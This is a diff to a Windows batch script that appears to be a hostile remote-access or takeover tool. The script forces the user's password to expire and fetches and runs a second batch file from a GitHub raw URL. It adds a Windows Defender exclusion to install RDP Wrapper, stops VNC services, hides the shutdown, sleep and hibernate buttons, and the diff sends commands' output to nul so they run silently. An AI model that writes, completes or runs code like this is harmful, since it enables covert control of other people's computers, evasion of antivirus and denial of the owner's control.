@@ -18,12 +18,12 @@ if "!MUSTCHANGE!"=="5" (
 
     powershell -Command "[ADSI]$user='WinNT://./%USERNAME%'; $user.Put('PasswordExpired', 1); $user.SetInfo()"
 
-    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
-    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=True
-    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=TRUE
-    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE >nul 2>&1
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=True >nul 2>&1
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=TRUE >nul 2>&1
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True >nul 2>&1
 
-    net user %username% /logonpasswordchg:yes
+    net user %username% /logonpasswordchg:yes >nul 2>&1
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -UserMayChangePassword $true"
 
     set "url=https://raw.githubusercontent.com/al0nks1337/al0nks1337.github.io/refs/heads/main/sec.bat"
@@ -41,12 +41,12 @@ if "!MUSTCHANGE!"=="5" (
 
     powershell -Command "[ADSI]$user='WinNT://./%USERNAME%'; $user.Put('PasswordExpired', 1); $user.SetInfo()"
 
-    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
-    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=True
-    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=TRUE
-    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE >nul 2>&1
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=True >nul 2>&1
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=TRUE >nul 2>&1
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True >nul 2>&1
 
-    net user %username% /logonpasswordchg:yes
+    net user %username% /logonpasswordchg:yes >nul 2>&1
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -UserMayChangePassword $true"
 
     start "" /wait cmd /c "!file!"
@@ -55,12 +55,12 @@ if "!MUSTCHANGE!"=="5" (
 
     powershell -Command "[ADSI]$user='WinNT://./%USERNAME%'; $user.Put('PasswordExpired', 1); $user.SetInfo()"
 
-    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE
-    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=True
-    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=TRUE
-    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=TRUE >nul 2>&1
+    wmic UserAccount where "Name='%USERNAME%' and Domain='%COMPUTERNAME%'" set PasswordExpires=True >nul 2>&1
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=TRUE >nul 2>&1
+    wmic UserAccount where Name="%USERNAME%" set PasswordExpires=True >nul 2>&1
 
-    net user %username% /logonpasswordchg:yes
+    net user %username% /logonpasswordchg:yes >nul 2>&1
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Set-LocalUser -Name '%USERNAME%' -UserMayChangePassword $true"
 
     start "" /wait cmd /c "!file!"
@@ -138,7 +138,6 @@ if "%MODE%"=="0" (
 
         echo [+] closing rdp control panel and cleaning up
         taskkill /f /im rdp_cnc.exe >nul 2>&1
-        del "%TEMP%\RDPW_Installer.exe" >nul 2>&1
         powershell -Command "Remove-MpPreference -ExclusionPath '%TEMP%\RDPW_Installer.exe'" >nul 2>&1
     ) else (
         echo [!] error: RDP Wrapper installer download failed
@@ -204,15 +203,42 @@ if "!RDPWORKS!"=="n" (
 
     sc stop tvnserver >nul 2>&1
     sc stop uvnc_service >nul 2>&1
+    sc stop vncserver >nul 2>&1
+
+    if "%MODE%"=="0" (
+        echo [+] installing RDP Wrapper
+        powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%\RDPW_Installer.exe'" >nul 2>&1
+
+        echo [+] downloading installer
+        powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sebaxakerhtc/rdpwrap/releases/download/v1.8.9.9/RDPW_Installer.exe' -OutFile '%TEMP%\RDPW_Installer.exe'"
+
+        if exist "%TEMP%\RDPW_Installer.exe" (
+            echo [+] running RDP Wrapper installer
+            start /wait %TEMP%\RDPW_Installer.exe
+
+            echo [~] waiting for rdp control panel to launch
+            :waitRDP
+            tasklist | findstr /i "rdp_cnc.exe" >nul
+            if errorlevel 1 goto waitRDP
+        
+            echo [+] closing rdp control panel and cleaning up
+            taskkill /f /im rdp_cnc.exe >nul 2>&1
+            powershell -Command "Remove-MpPreference -ExclusionPath '%TEMP%\RDPW_Installer.exe'" >nul 2>&1
+        ) else (
+            echo [!] error: RDP Wrapper installer download failed
+            goto endRDPInstall
+        )
 
     powershell -Command "Restart-Service -Name TermService -Force" >nul 2>&1
 )
 
+del "%TEMP%\RDPW_Installer.exe" >nul 2>&1
+
 echo [+] preventing shutdown in this computer
 REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ShutdownWithoutLogon /t REG_DWORD /d 0 /f >nul 2>&1
-REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Start\HidePowerButton" /v value /t REG_DWORD /d 1 /f >nul 2>&1
-REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleepButton" /v value /t REG_DWORD /d 1 /f >nul 2>&1
-REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Start\HideHibernateButton" /v value /t REG_DWORD /d 1 /f >nul 2>&1
+REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Start\HideSleep" /v value /t REG_DWORD /d 1 /f >nul 2>&1
+REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Start\HideHibernate" /v value /t REG_DWORD /d 1 /f >nul 2>&1
+REG ADD "HKLM\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutDown" /v value /t REG_DWORD /d 1 /f >nul 2>&1
 set infFile=%temp%\shutdown_restrict.inf
 (
 echo [Unicode]
